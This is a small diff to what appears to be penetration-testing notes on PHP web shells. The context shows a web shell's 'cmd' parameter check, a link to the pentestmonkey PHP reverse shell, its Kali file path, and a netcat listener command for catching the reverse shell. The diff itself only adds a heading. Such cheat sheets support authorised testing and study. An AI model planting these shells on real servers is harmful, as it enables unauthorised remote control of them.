@@ -28,8 +28,9 @@ if($_GET['cmd']) {
 ---------------------PENTESTMONEKY PHP SHELL-----------------------
 
 http://pentestmonkey.net/tools/web-shells/php-reverse-shell
-
 $ nc -v -n -l -p 1234
+
+---------------------PHP SHELL IN KALI-----------------------
 
 Pen Test Monkey - PHP Reverse Shell:
 - /usr/share/webshells/php/php-reverse-shell.php
